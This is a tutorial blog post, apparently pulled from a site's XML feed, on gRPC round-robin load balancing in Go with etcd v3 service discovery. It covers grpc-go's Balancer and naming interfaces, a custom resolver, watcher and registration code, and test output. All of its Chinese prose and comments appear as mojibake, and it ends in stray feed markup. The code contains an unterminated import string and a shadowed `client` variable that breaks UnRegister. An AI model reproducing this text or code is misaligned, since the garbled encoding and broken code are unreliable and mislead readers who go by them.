å®¢æˆ·ç«¯å®ä¾‹åŒ–è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œå¦‚æœè§£æè¿”å›çš„åœ°å€æ˜¯è´Ÿè½½å‡è¡¡å™¨åœ°å€ï¼Œåˆ™å®¢æˆ·ç«¯å°†ä½¿ç”¨grpclbç­–ç•¥ï¼Œå¦åˆ™å®¢æˆ·ç«¯ä½¿ç”¨æœåŠ¡é…ç½®è¯·æ±‚çš„è´Ÿè½½å‡è¡¡ç­–ç•¥,å¦‚æœæ²¡æœ‰ä»æœåŠ¡é…ç½®æ–‡ä»¶ä¸­è§£æåˆ°è´Ÿè½½å‡è¡¡ç­–ç•¥, åˆ™å®¢æˆ·ç«¯ä¼šé€‰æ‹©ç¬¬ä¸€ä¸ªå¯ç”¨çš„æœåŠ¡åœ°å€ã€‚ è´Ÿè½½å‡è¡¡ç­–ç•¥ä¸ºæ¯ä¸ªæœåŠ¡å™¨åœ°å€åˆ›å»ºä¸€ä¸ªå­é€šé“ï¼ˆchannelï¼‰ã€‚ å½“æœ‰rpcè¯·æ±‚æ—¶ï¼Œè´Ÿè½½å‡è¡¡ç­–ç•¥å†³å®šé‚£ä¸ªå­é€šé“å³grpcæœåŠ¡å™¨å°†æ¥æ”¶è¯·æ±‚ï¼Œå½“å¯ç”¨æœåŠ¡å™¨ä¸ºç©ºæ—¶å®¢æˆ·ç«¯çš„è¯·æ±‚å°†è¢«é˜»å¡ã€‚ æºç è§£è¯»ä¸»è¦çœ‹å®˜æ–¹å¦‚ä½•å®ç°round robinè¿™ä¸ªè´Ÿè½½å‡è¡¡å™¨å’Œè´Ÿè½½å‡è¡¡å·¥ä½œæµç¨‹ã€‚ å»ºç«‹è¿æ¥åœ¨clientconn.goçš„DialContextå‡½æ•°ä¸­æè¿°äº†å®¢æˆ·ç«¯è¿æ¥è¿æ¥çš„è¿‡ç¨‹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// ctx: ä¸Šä¸‹æ–‡ç”¨äºå¤„ç†è¯·æ±‚å–æ¶ˆå’Œè¯·æ±‚è¶…æ—¶ç­‰æƒ…å†µ// target: é€šè¿‡è¿™ä¸ªå»ºç«‹è¿æ¥, å¦‚æœé‡‡ç”¨è´Ÿè½½å‡è¡¡æ¨¡å¼, ä»–ä»£è¡¨watcheråœ°å€, ç”¨äºwatchæœåŠ¡ç«¯åœ°å€å˜åŒ–// opts: å…¶ä»–å»ºç«‹è¿æ¥æ—¶çš„å‚æ•°func DialContext(ctx context.Context, target string, opts ...DialOption) (conn *ClientConn, err error) &#123;...... //çœç•¥go func() &#123; var addrs []Address if cc.dopts.balancer == nil &#123; //å¦‚æœæ²¡æœ‰è®¾ç½®è´Ÿè½½å‡è¡¡å™¨ï¼Œåˆ™ç›´æ¥è¿æ¥ addrs = append(addrs, Address&#123;Addr: target&#125;) &#125; else &#123; var credsClone credentials.TransportCredentials if creds != nil &#123; credsClone = creds.Clone() &#125; config := BalancerConfig&#123; DialCreds: credsClone, &#125; //å¯åŠ¨ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨,startå‡½æ•°ä¼šå¯åŠ¨ä¸€ä¸ªwatchç›‘å¬åœ°å€çš„å˜åŒ–. if err := cc.dopts.balancer.Start(target, config); err != nil &#123; waitC &lt;- err return &#125; // Notifyè¿”å›ä¸€ä¸ªé€šé“ï¼Œåœ¨æ¯æ¬¡æœåŠ¡å™¨åœ°å€å˜åŒ–åçš„æœ€æ–°åœ°å€ä¿¡æ¯. ch := cc.dopts.balancer.Notify() if ch == nil &#123; // There is no name resolver installed. addrs = append(addrs, Address&#123;Addr: target&#125;) &#125; else &#123; addrs, ok = &lt;-ch if !ok || len(addrs) == 0 &#123; waitC &lt;- errNoAddr return &#125; &#125; &#125; //å¯¹æ¯ä¸€ä¸ªåœ°å€è¿›è¡Œè¿æ¥, å› ä¸ºè¿™æ˜¯å®¢æˆ·ç«¯å¯åŠ¨æ—¶ï¼Œæ‰€ä»¥éœ€è¦å¯¹æ‰€æœ‰åœ°å€æ“ä½œ. for _, a := range addrs &#123; if err := cc.resetAddrConn(a, false, nil); err != nil &#123; waitC &lt;- err return &#125; &#125; close(waitC)&#125;().............. //çœç•¥ä¸€äº›ä»£ç if ok &#123; //è¿™é‡Œå¼€å¯ä¸€ä¸ªç›‘å¬goroutineï¼Œä¸»è¦æ˜¯ç›‘å¬æœåŠ¡å™¨åœ°å€å˜åŒ–å¹¶å¯¹æ–°çš„åœ°å€å»ºç«‹è¿æ¥ï¼Œå¯¹è€çš„åœ°å€å…³é—­è¿æ¥ go cc.lbWatcher()&#125; ä»é‡Œé¢å¯ä»¥çœ‹å‡ºå…³äºè´Ÿè½½å‡è¡¡éƒ¨åˆ†, ä½¿ç”¨balancerçš„Startæ¥å¯åŠ¨åœ°å€ç›‘å¬, Notifyæ¥è·å–åœ°å€å˜åŒ–, å› æ­¤æ ¸å¿ƒæ˜¯ç†è§£Balanceræ¥å£ã€‚ è´Ÿè½½å‡è¡¡æ¥å£åœ¨balancer.goä¸­æœ‰å…³äºæ­¤çš„å®šä¹‰:123456789101112131415161718192021222324// Balancer ä¸ºRPCsé€‰æ‹©ç½‘ç»œåœ°å€(backend service) type Balancer interface &#123; //å¯åŠ¨ä¸€ä¸ªè´Ÿè½½å‡è¡¡ï¼Œå†…éƒ¨ä¼šå¯åŠ¨ä¸€ä¸ªåç§°æœåŠ¡å™¨çš„watcherï¼Œä¸æ–­ç›‘å¬åœ°å€çš„å˜åŒ– Start(target string, config BalancerConfig) error // é€šçŸ¥Balancer gRPCé€šè¿‡è¯¥åœ°å€å»ºç«‹äº†ä¸€ä¸ªå’Œserverçš„è¿æ¥, è¿”å›ä¸€ä¸ªdownçš„å‡½æ•°, å½“è¿æ¥æ–­å¼€æˆ–è€…ä¸¢å¤±ä¼šè¢«è°ƒç”¨ã€‚ Up(addr Address) (down func(error)) // è·å¾—ä¸‹ä¸€æ¬¡è¿æ¥æœåŠ¡å™¨çš„åœ°å€ // 1) å¦‚æœè¿”å›ä¸€ä¸ªå·²ç»å»ºç«‹è¿æ¥çš„åœ°å€, RPCå°†åŸºäºè¯¥è¿æ¥ç›´æ¥è¿›è¡Œè°ƒç”¨ // 2) å¦‚æœè¿”å›ä¸€ä¸ªæ­£åœ¨è¿æ¥å»ºç«‹ä¸­çš„åœ°å€(Notifyåˆå§‹åŒ–æ—¶å‘ç”Ÿè¿‡æ¥çš„),ä½†æ˜¯è¿˜æœªå®Œæˆè¿æ¥å»ºç«‹ï¼ŒRPCè°ƒç”¨å¯èƒ½ä¼šå¤±è´¥æˆ–è€…æˆåŠŸ // 3) å¦‚æœè¿”å›ä¸€ä¸ªä¸å­˜åœ¨çš„è¿æ¥, ä¼šå½“åšä¸€ä¸ªé”™è¯¯å’Œå¤±è´¥çš„ç›¸åº”çš„RPC // å› æ­¤å¦‚æœæƒ³è¦å®ç°ä¸€ä¸ªè‡ªå®šä¹‰çš„Balancer, å»ºè®®éµå¾ªå¦‚ä¸‹è§„åˆ™ // 1) å¦‚æœopts.BlockingWaitä¸ºtrue, éœ€è¦è¿”å›ä¸€ä¸ªå·²ç»å»ºç«‹è¿æ¥çš„åœ°å€æˆ–è€…é˜»å¡åˆ°ç›´åˆ°æœ‰å»ºç«‹è¿æ¥çš„åœ°å€æ—¶è¿”å›, å½“é˜»å¡æ—¶ // éœ€è¦æ£€æµ‹è¶…æ—¶æˆ–è€…å–æ¶ˆè¯¥RPC // 2) å¦‚æœopts.BlockingWaitä¸ºfalse, å®ƒåº”è¯¥ç«‹å³é€šè¿‡é€šçŸ¥æœºåˆ¶(Nofify)è¿”å›ä¸€ä¸ªåœ°å€ï¼Œè€Œä¸æ˜¯é˜»å¡ã€‚ // // putç”¨äºæ”¶é›†å’ŒæŠ¥å‘ŠRPCçš„çŠ¶æ€ç»™è¿œç¨‹çš„LB Get(ctx context.Context, opts BalancerGetOptions) (addr Address, put func(), err error) // è¿”å›ä¸€ä¸ªchannelç”¨äºå®æ—¶è·å–éœ€è¦å»ºç«‹è¿æ¥çš„åœ°å€åˆ—è¡¨, è¿™äº›åœ°å€å¯èƒ½æ¥æºäºä¸€ä¸ªname resoveræˆ–è€…ä¸€ä¸ªremote LB, // gRPCå°†ä¸ä¹‹å‰ä¿å­˜çš„è¿æ¥åœ°å€è¿›è¡Œæ¯”è¾ƒ, å¦‚æœè¯¥åœ°å€åˆ—è¡¨æœ‰æ–°å¢çš„, gRPCå¯¹æ–°å¢çš„åœ°å€è¿›è¡Œè¿æ¥, å¦‚æœè¯¥åœ°å€æœ‰å‡å°‘, gRPCä¼šä¼˜é›…å…³é—­è¿™ // å‡å°‘çš„è¿æ¥, å¦‚æœæ²¡å˜åŒ–, gRPCæ— åŠ¨ä½œ, æ³¨æ„channelé‡Œé¢è¿”å›çš„ä¸€ä¸ª å®Œæ•´çš„åœ°å€åˆ—è¡¨, è€Œä¸æ˜¯å¢é‡ã€‚ Notify() &lt;-chan []Address //å…³é—­è´Ÿè½½å‡è¡¡å™¨ Close() error&#125; å®˜æ–¹å®ç°å®˜æ–¹çš„Round Robinå°±æ˜¯Balanceræ¥å£çš„ä¸€ä¸ªå®ç°, ä½†æ˜¯åœ¨çœ‹ä»–å¦‚ä½•å®ç°Startå’ŒNotifyä¹‹å‰, å…ˆçœ‹çœ‹åç§°è§£ææœåŠ¡çš„æ¥å£å®šä¹‰. åç§°è§£ææœåŠ¡åç§°è§£ææœåŠ¡: naming.go, è¯¥åŒ…å®šä¹‰äº†gRPCåç§°è§£ææœåŠ¡çš„APIå’Œç›¸å…³æ•°æ®ç»“æ„12345678910111213141516171819202122232425262728293031323334353637// Operation å®šä¹‰äº†åç§°è§£ææ—¶ç›¸åº”çš„åŠ¨ä½œ.type Operation uint8const ( // Add è¡¨ç¤ºæ–°å¢åœ°å€çš„æ“ä½œ Add Operation = iota // Delete è¡¨ç¤ºéœ€è¦åˆ é™¤ä¸€ä¸ªå·²å­˜åœ¨åœ°å€çš„æ“ä½œ Delete)// Update defines a name resolution update. Notice that it is not valid having both// empty string Addr and nil Metadata in an Update.type Update struct &#123; // å…·ä½“çš„æ›´æ–°åŠ¨ä½œ, æ¯”å¦‚ä¸Šé¢å®šä¹‰çš„Addæˆ–è€…Delete Op Operation // éœ€è¦æ›´æ–°çš„åœ°å€, å¦‚æœä¸ºç©ºå­—ç¬¦ä¸², è¡¨ç¤ºè¿™å„¿æ²¡æœ‰åœ°å€éœ€è¦æ›´æ–° Addr string // ç”¨äºæè¿°updatedæ“ä½œæ—¶çš„ä¸€äº›metaæ•°æ®, å¦‚æœæ˜¯è‡ªå·±å®ç°åç§°è§£ææœåŠ¡Metadataæ˜¯ä¸éœ€è¦ä¼ å…¥çš„ã€‚ Metadata interface&#123;&#125;&#125;// Resolver creates a Watcher for a target to track its resolution changes.type Resolver interface &#123; // é€šè¿‡ä¸€ä¸ªåå­—å¾—åˆ°ä¸€ä¸ªwatcherï¼Œç›‘å¬æœåŠ¡å™¨åœ°å€å˜åŒ–ã€‚ Resolve(target string) (Watcher, error)&#125;// Watcher watches for the updates on the specified target.type Watcher interface &#123; // Next blocks until an update or error happens. It may return one or more // updates. The first call should get the full set of the results. It should // return an error if and only if Watcher cannot recover. // å¾—åˆ°ä¸‹æ¬¡æ›´æ–°çš„åœ°å€ Next() ([]*Update, error) // Close closes the Watcher. Close()&#125; round robin balanceråœ¨äº†è§£äº†åç§°è§£ææœåŠ¡æ¥å£è¿‡å, çœ‹çœ‹round robinçš„å…·ä½“å®ç°:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899type roundRobin struct &#123; r naming.Resolver w naming.Watcher addrs []*addrInfo // å®¢æˆ·ç«¯åº”è¯¥è¿æ¥çš„æ‰€æœ‰åœ°å€ mu sync.Mutex addrCh chan []Address // æœåŠ¡åœ°å€åˆ—è¡¨æ›´æ–°é€šçŸ¥channel next int // index of the next address to return for Get() waitCh chan struct&#123;&#125; // the channel to block when there is no connected address available done bool // The Balancer is closed.&#125;func (rr *roundRobin) Start(target string, config BalancerConfig) error &#123; rr.mu.Lock() defer rr.mu.Unlock() if rr.done &#123; return ErrClientConnClosing &#125; if rr.r == nil &#123; // å¦‚æœæ²¡æœ‰ä½¿ç”¨åç§°è§£ææœåŠ¡, å°†ä¸ä¼šè¿›è¡Œåç§°è§£æ, åœ¨è¿™ç§æƒ…å†µä¸‹targetå°†ä¼šä½œä¸ºå”¯ä¸€å¯ç”¨çš„åœ°å€è¢«æ”¾å…¥ // rr.addrs è¢«å®¢æˆ·ç«¯ä½¿ç”¨, æ­¤æ—¶addrChå°†æ²¡æœ‰åœ°å€, å§‹ç»ˆä¸ºnil rr.addrs = append(rr.addrs, &amp;addrInfo&#123;addr: Address&#123;Addr: target&#125;&#125;) return nil &#125; // å¦‚æœåç§°è§£ææœåŠ¡å­˜åœ¨å°†ä¼šè°ƒç”¨åç§°è§£ææœåŠ¡çš„Resolveæ–¹æ³•, ç”Ÿæˆä¸€ä¸ªwatcher w, err := rr.r.Resolve(target) if err != nil &#123; return err &#125; rr.w = w rr.addrCh = make(chan []Address) // å¯ä¸€ä¸ªGoroutineæ¥ä¸“é—¨æ›´æ–°åœ°å€åˆ°addrCh go func() &#123; for &#123; if err := rr.watchAddrUpdates(); err != nil &#123; return &#125; &#125; &#125;() return nil&#125;func (rr *roundRobin) watchAddrUpdates() error &#123; // è·å–éœ€è¦æ›´æ–°çš„åœ°å€ updates, err := rr.w.Next() if err != nil &#123; grpclog.Printf("grpc: the naming watcher stops working due to %v.\n", err) return err &#125; rr.mu.Lock() defer rr.mu.Unlock() for _, update := range updates &#123; addr := Address&#123; Addr: update.Addr, Metadata: update.Metadata, &#125; switch update.Op &#123; // å¦‚æœåœ°å€æ²¡æœ‰é‡å¤, åˆ™æ·»åŠ åˆ°åœ°å€åˆ—è¡¨ä¸­å»(rr.addrs) case naming.Add: var exist bool for _, v := range rr.addrs &#123; if addr == v.addr &#123; exist = true grpclog.Println("grpc: The name resolver wanted to add an existing address: ", addr) break &#125; &#125; if exist &#123; continue &#125; rr.addrs = append(rr.addrs, &amp;addrInfo&#123;addr: addr&#125;) // ä»åœ°å€åˆ—è¡¨ä¸­(rr.addrs)ç§»é™¤å·²ç»å­˜åœ¨çš„åœ°å€ case naming.Delete: for i, v := range rr.addrs &#123; if addr == v.addr &#123; copy(rr.addrs[i:], rr.addrs[i+1:]) rr.addrs = rr.addrs[:len(rr.addrs)-1] break &#125; &#125; default: grpclog.Println("Unknown update.Op ", update.Op) &#125; &#125; // Make a copy of rr.addrs and write it onto rr.addrCh so that gRPC internals gets notified. open := make([]Address, len(rr.addrs)) for i, v := range rr.addrs &#123; open[i] = v.addr &#125; if rr.done &#123; return ErrClientConnClosing &#125; rr.addrCh &lt;- open return nil&#125;// ç›´æ¥è¿”å›åœ°å€å˜æ›´çš„channel(æ³¨æ„åœ°å€ä¸æ˜¯å¢é‡æ˜¯å…¨é‡)func (rr *roundRobin) Notify() &lt;-chan []Address &#123; return rr.addrCh&#125; ä»£ç å®ç°æ ¹æ®gRPCå®˜æ–¹æä¾›çš„è®¾è®¡æ€è·¯ï¼ŒåŸºäºè¿›ç¨‹å†…LBæ–¹æ¡ˆ(å³ç¬¬2ä¸ªæ¡ˆï¼Œé˜¿é‡Œå¼€æºçš„æœåŠ¡æ¡†æ¶ Dubbo ä¹Ÿæ˜¯é‡‡ç”¨ç±»ä¼¼æœºåˆ¶)ï¼Œç»“åˆåˆ†å¸ƒå¼ä¸€è‡´çš„ç»„ä»¶ï¼ˆå¦‚Zookeeperã€Consulã€Etcdï¼‰ï¼Œå¯æ‰¾åˆ°gRPCæœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡çš„å¯è¡Œè§£å†³æ–¹æ¡ˆã€‚æ ¹æ®å®˜æ–¹å·²ç»å®ç°Round Robinè´Ÿè½½å‡è¡¡å™¨, æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ç°ä¸€ä¸ªåå­—æœåŠ¡å™¨çš„æ¥å£ï¼Œç„¶åå°è£…åˆ°è¿™ä¸ªè´Ÿè½½å‡è¡¡å™¨ä¸­ï¼Œè¿™æ ·å°±ä¸éœ€è¦è‡ªå·±å®ç°æ•´ä¸ªè´Ÿè½½å‡è¡¡å™¨ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç»“åˆetcdv3å®ç°ä¸€ä¸ªåè¯è§£ææœåŠ¡, å®Œæ•´ç¤ºä¾‹ä»£ç†: gRPC LBç¤ºä¾‹ä»£ç  å®ç°åç§°è§£ææœåŠ¡ é¦–å…ˆå®šä¹‰ä¸€ä¸ªresolver, resolverè¦æ±‚è¿”å›ä¸€ä¸ªå®ç°äº†watcheræ¥å£çš„å¯¹è±¡, è€Œwatcheréœ€è¦æœ‰æœåŠ¡åç§°å’Œetcdå®¢æˆ·ç«¯æ‰èƒ½è§£æå‡ºçœŸæ­£çš„æœåŠ¡åœ°å€: resolver.go 123456789101112131415161718192021222324252627282930313233343536373839package lbimport ( "errors" "fmt "strings" etcd3 "github.com/coreos/etcd/clientv3" "google.golang.org/grpc/naming")// resolver is the implementaion of grpc.naming.Resolvertype resolver struct &#123; serviceName string // service name to resolve&#125;// NewResolver return resolver with service namefunc NewResolver(serviceName string) *resolver &#123; return &amp;resolver&#123;serviceName: serviceName&#125;&#125;// Resolve to resolve the service from etcd, target is the dial address of etcd// target example: "http://127.0.0.1:2379,http://127.0.0.1:12379,http://127.0.0.1:22379"func (re *resolver) Resolve(target string) (naming.Watcher, error) &#123; if re.serviceName == "" &#123; return nil, errors.New("grpclb: no service name provided") &#125; // generate etcd client client, err := etcd3.New(etcd3.Config&#123; Endpoints: strings.Split(target, ","), &#125;) if err != nil &#123; return nil, fmt.Errorf("grpclb: creat etcd3 client failed: %s", err.Error()) &#125; // Return watcher return &amp;watcher&#123;re: re, client: *client&#125;, nil&#125; watcheræŒæœ‰æœåŠ¡åç§°å’Œetcdå®¢æˆ·ç«¯,ä»…éœ€è¦è°ƒç”¨etcdå®¢æˆ·ç«¯æŸ¥å‡ºè¯¥æœåŠ¡çš„åœ°å€åˆ—è¡¨å³å¯, æ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨etcdå®ç°ä¸€ä¸ªwatcher(å®ç°Nextå’ŒColseæ–¹æ³•): watcher.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package lbimport ( "fmt" etcd3 "github.com/coreos/etcd/clientv3" "golang.org/x/net/context" "google.golang.org/grpc/naming" "github.com/coreos/etcd/mvcc/mvccpb")// watcher is the implementaion of grpc.naming.Watchertype watcher struct &#123; re *resolver // re: Etcd Resolver client etcd3.Client isInitialized bool&#125;// Close do nothingfunc (w *watcher) Close() &#123;&#125;// Next to return the updatesfunc (w *watcher) Next() ([]*naming.Update, error) &#123; // prefix is the etcd prefix/value to watch prefix := fmt.Sprintf("/%s/%s/", Prefix, w.re.serviceName) // check if is initialized // ç¬¬ä¸€æ¬¡åŠåˆå§‹åŒ–æ—¶éœ€è¦è¿”å›ä¸€ä¸ªå…¨é‡çš„åœ°å€ç”¨äºæ›´æ–° if !w.isInitialized &#123; // query addresses from etcd resp, err := w.client.Get(context.Background(), prefix, etcd3.WithPrefix()) w.isInitialized = true if err == nil &#123; addrs := extractAddrs(resp) //if not empty, return the updates or watcher new dir if l := len(addrs); l != 0 &#123; updates := make([]*naming.Update, l) for i := range addrs &#123; updates[i] = &amp;naming.Update&#123;Op: naming.Add, Addr: addrs[i]&#125; &#125; return updates, nil &#125; &#125; &#125; // generate etcd Watcher // åˆå§‹åŒ–å ç›‘å¬å˜é‡å³å¯ rch := w.client.Watch(context.Background(), prefix, etcd3.WithPrefix()) for wresp := range rch &#123; for _, ev := range wresp.Events &#123; switch ev.Type &#123; case mvccpb.PUT: return []*naming.Update&#123;&#123;Op: naming.Add, Addr: string(ev.Kv.Value)&#125;&#125;, nil case mvccpb.DELETE: return []*naming.Update&#123;&#123;Op: naming.Delete, Addr: string(ev.Kv.Value)&#125;&#125;, nil &#125; &#125; &#125; return nil, nil&#125;func extractAddrs(resp *etcd3.GetResponse) []string &#123; addrs := []string&#123;&#125; if resp == nil || resp.Kvs == nil &#123; return addrs &#125; for i := range resp.Kvs &#123; if v := resp.Kvs[i].Value; v != nil &#123; addrs = append(addrs, string(v)) &#125; &#125; return addrs&#125; å®ç°æœåŠ¡çš„æ³¨å†Œåç§°è§£æåšå®Œäº†, éœ€è¦æœåŠ¡å°†åœ°å€æ³¨å†Œåˆ°etcdç›¸åº”çš„åœ°å€ä¸‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package lbimport ( "fmt" "log" "strings" "time" etcd3 "github.com/coreos/etcd/clientv3" "github.com/coreos/etcd/etcdserver/api/v3rpc/rpctypes" "golang.org/x/net/context")// Prefix should start and end with no slashvar Prefix = "etcd3_naming"var client etcd3.Clientvar serviceKey stringvar stopSignal = make(chan bool, 1)// Registerfunc Register(name string, host string, port int, target string, interval time.Duration, ttl int) error &#123; serviceValue := fmt.Sprintf("%s:%d", host, port) serviceKey = fmt.Sprintf("/%s/%s/%s", Prefix, name, serviceValue) // get endpoints for register dial address var err error client, err := etcd3.New(etcd3.Config&#123; Endpoints: strings.Split(target, ","), &#125;) if err != nil &#123; return fmt.Errorf("grpclb: create etcd3 client failed: %v", err) &#125; go func() &#123; // invoke self-register with ticker ticker := time.NewTicker(interval) for &#123; // minimum lease TTL is ttl-second resp, _ := client.Grant(context.TODO(), int64(ttl)) // å¦‚æœç¬¬ä¸€æ¬¡æ³¨å†Œè¯¥keyå°†ä¸å­˜åœ¨, éœ€è¦å»ºç«‹key, å¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡æ³¨å†Œ, åˆ™åˆ·æ–°è¯¥keyçš„å€¼ _, err := client.Get(context.Background(), serviceKey) if err != nil &#123; if err == rpctypes.ErrKeyNotFound &#123; if _, err := client.Put(context.TODO(), serviceKey, serviceValue, etcd3.WithLease(resp.ID)); err != nil &#123; log.Printf("grpclb: set service '%s' with ttl to etcd3 failed: %s", name, err.Error()) &#125; &#125; else &#123; log.Printf("grpclb: service '%s' connect to etcd3 failed: %s", name, err.Error()) &#125; &#125; else &#123; // refresh set to true for not notifying the watcher if _, err := client.Put(context.Background(), serviceKey, serviceValue, etcd3.WithLease(resp.ID)); err != nil &#123; log.Printf("grpclb: refresh service '%s' with ttl to etcd3 failed: %s", name, err.Error()) &#125; &#125; select &#123; case &lt;-stopSignal: return case &lt;-ticker.C: &#125; &#125; &#125;() return nil&#125;// UnRegister delete registered service from etcdfunc UnRegister() error &#123; stopSignal &lt;- true stopSignal = make(chan bool, 1) // just a hack to avoid multi UnRegister deadlock var err error if _, err := client.Delete(context.Background(), serviceKey); err != nil &#123; log.Printf("grpclb: deregister '%s' failed: %s", serviceKey, err.Error()) &#125; else &#123; log.Printf("grpclb: deregister '%s' ok.", serviceKey) &#125; return err&#125; å®ç°æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ å®šä¹‰æœåŠ¡æ¥å£å¥‘çº¦: hello.proto 12345678910111213141516171819202122232425syntax = &quot;proto3&quot;;option java_multiple_files = true;option java_package = &quot;com.midea.jr.test.grpc&quot;;option java_outer_classname = &quot;HelloWorldProto&quot;;option objc_class_prefix = &quot;HLW&quot;;package helloworld;// The greeting service definition.service Greeter &#123; // Sends a greeting rpc SayHello (HelloRequest) returns (HelloReply) &#123; &#125;&#125;// The request message containing the user&apos;s name.message HelloRequest &#123; string name = 1;&#125;// The response message containing the greetingsmessage HelloReply &#123; string message = 1;&#125; æœåŠ¡ç«¯å¯åŠ¨æ—¶éœ€è¦æ³¨å†Œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package mainimport ( "flag" "fmt" "log" "net" "os" "os/signal" "syscall" "time" "golang.org/x/net/context" "google.golang.org/grpc" pb "golang/grpc/example/pb" grpclb "golang/grpc/lb")var ( serv = flag.String("service", "hello_service", "service name") port = flag.Int("port", 50001, "listening port") reg = flag.String("reg", "http://192.168.204.7:2379", "register etcd address"))func main() &#123; flag.Parse() lis, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *port)) if err != nil &#123; panic(err) &#125; err = grpclb.Register(*serv, "127.0.0.1", *port, *reg, time.Second*10, 15) if err != nil &#123; panic(err) &#125; ch := make(chan os.Signal, 1) signal.Notify(ch, syscall.SIGTERM, syscall.SIGINT, syscall.SIGKILL, syscall.SIGHUP, syscall.SIGQUIT) go func() &#123; s := &lt;-ch log.Printf("receive signal '%v'", s) grpclb.UnRegister() os.Exit(1) &#125;() log.Printf("starting hello service at %d", *port) s := grpc.NewServer() pb.RegisterGreeterServer(s, &amp;server&#123;&#125;) s.Serve(lis)&#125;// server is used to implement helloworld.GreeterServer.type server struct&#123;&#125;// SayHello implements helloworld.GreeterServerfunc (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) &#123; fmt.Printf("%v: Receive is %s\n", time.Now(), in.Name) return &amp;pb.HelloReply&#123;Message: "Hello " + in.Name&#125;, nil&#125; å®¢æˆ·ç«¯ä½¿ç”¨round robinè´Ÿè½½å‡è¡¡å™¨ 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( "flag" "fmt" "time" pb "golang/grpc/example/pb" grpclb "golang/grpc/lb" "strconv" "golang.org/x/net/context" "google.golang.org/grpc")var ( serv = flag.String("service", "hello_service", "service name") reg = flag.String("reg", "http://192.168.204.7:2379", "register etcd address"))func main() &#123; flag.Parse() r := grpclb.NewResolver(*serv) b := grpc.RoundRobin(r) ctx, _ := context.WithTimeout(context.Background(), 10*time.Second) conn, err := grpc.DialContext(ctx, *reg, grpc.WithInsecure(), grpc.WithBalancer(b)) if err != nil &#123; panic(err) &#125; ticker := time.NewTicker(1 * time.Second) for t := range ticker.C &#123; client := pb.NewGreeterClient(conn) resp, err := client.SayHello(context.Background(), &amp;pb.HelloRequest&#123;Name: "world " + strconv.Itoa(t.Second())&#125;) if err == nil &#123; fmt.Printf("%v: Reply is %s\n", t, resp.Message) &#125; &#125;&#125; æµ‹è¯•å¯åŠ¨3ä¸ªæœåŠ¡ç«¯123456$go run main.go -port 500012017/08/05 10:57:20 starting hello service at 500012017-08-05 11:02:00.81258994 +0800 CST: Receive is world 02017-08-05 11:02:03.812191776 +0800 CST: Receive is world 32017-08-05 11:02:06.812970792 +0800 CST: Receive is world 62017-08-05 11:02:09.809401404 +0800 CST: Receive is world 9 123456$go run main.go -port 500022017/08/05 10:58:13 starting hello service at 500022017-08-05 11:02:01.812108579 +0800 CST: Receive is world 12017-08-05 11:02:04.811493797 +0800 CST: Receive is world 42017-08-05 11:02:07.808267481 +0800 CST: Receive is world 72017-08-05 11:02:10.808644591 +0800 CST: Receive is world 10 123456$go run main.go -port 500032017/08/05 10:58:42 starting hello service at 500032017-08-05 11:02:02.811818858 +0800 CST: Receive is world 22017-08-05 11:02:05.812063511 +0800 CST: Receive is world 52017-08-05 11:02:08.812688805 +0800 CST: Receive is world 82017-08-05 11:02:11.811770723 +0800 CST: Receive is world 11 å¯åŠ¨å®¢æˆ·ç«¯12345678910111213 $go run main.go2017-08-05 11:02:00.812164403 +0800 CST: Reply is Hello world 02017-08-05 11:02:01.811569222 +0800 CST: Reply is Hello world 12017-08-05 11:02:02.811516841 +0800 CST: Reply is Hello world 22017-08-05 11:02:03.811806037 +0800 CST: Reply is Hello world 32017-08-05 11:02:04.811077475 +0800 CST: Reply is Hello world 42017-08-05 11:02:05.811687449 +0800 CST: Reply is Hello world 52017-08-05 11:02:06.812519507 +0800 CST: Reply is Hello world 62017-08-05 11:02:07.807912824 +0800 CST: Reply is Hello world 72017-08-05 11:02:08.812355134 +0800 CST: Reply is Hello world 82017-08-05 11:02:09.809015778 +0800 CST: Reply is Hello world 92017-08-05 11:02:10.808287335 +0800 CST: Reply is Hello world 102017-08-05 11:02:11.81142561 +0800 CST: Reply is Hello world 11 æœ€åæˆ‘ä»¬çœ‹çœ‹etcdé‡Œé¢æˆ‘ä»¬æ³¨å†Œçš„æœåŠ¡:1234567root@etcd-node01:~# etcdctl get --prefix --endpoints=192.168.204.7:2379 "/etcd3_naming"/etcd3_naming/hello_service/127.0.0.1:50001127.0.0.1:50001/etcd3_naming/hello_service/127.0.0.1:50002127.0.0.1:50002/etcd3_naming/hello_service/127.0.0.1:50003127.0.0.1:50003 å‰©ä¸‹äº†åœæ‰ä¸€äº›æœåŠ¡,å®¢æˆ·ç«¯æ˜¯å¦æ­£å¸¸å°±ä½ ä»¬è‡ªå·±æµ‹è¯•äº†ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>APIGateway</tag>
        <tag>gRPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¾®æœåŠ¡ä¹‹API Gateway]]></title>
    <url>%2F2017%2F08%2F01%2Fapi-gateway%2F</url>
